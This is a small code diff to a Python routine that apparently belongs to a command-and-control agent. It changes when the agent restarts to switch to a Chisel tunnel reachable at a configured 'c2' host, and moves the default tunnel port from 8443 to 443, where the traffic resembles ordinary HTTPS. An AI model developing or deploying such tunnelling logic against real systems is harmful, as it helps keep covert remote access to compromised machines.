@@ -114,12 +114,12 @@ def main():
         _restart()
         return 1
 
-    if state == "connected" and method and method != "chisel":
+    if method and method != "chisel" and state in ("connected", "attempting"):
         cfg = _load_config()
         chisel_cfg = cfg.get("chisel", {})
         if chisel_cfg.get("enabled", False):
             c2_host = cfg.get("c2", {}).get("host", "")
-            server_port = chisel_cfg.get("server_port", 8443)
+            server_port = chisel_cfg.get("server_port", 443)
             if c2_host and _chisel_server_reachable(c2_host, server_port):
                 _log("Connected via %s but Chisel server is reachable — "
                      "restarting to upgrade" % method)
